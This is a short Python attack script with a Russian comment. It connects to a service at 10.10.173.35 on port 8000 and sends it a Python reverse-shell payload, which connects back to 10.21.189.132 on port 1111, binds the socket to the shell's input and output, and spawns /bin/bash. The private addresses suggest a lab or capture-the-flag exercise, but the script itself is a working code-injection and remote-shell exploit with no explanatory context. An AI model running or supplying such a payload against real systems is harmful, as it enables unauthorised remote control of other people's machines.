import socket

target = "10.10.173.35"
port = 8000

# Создаём сырое TCP-подключение
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(b'import socket,os,pty;s=socket.socket();s.connect(("10.21.189.132",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")')
response = s.recv(4096).decode()
print(response)
s.close()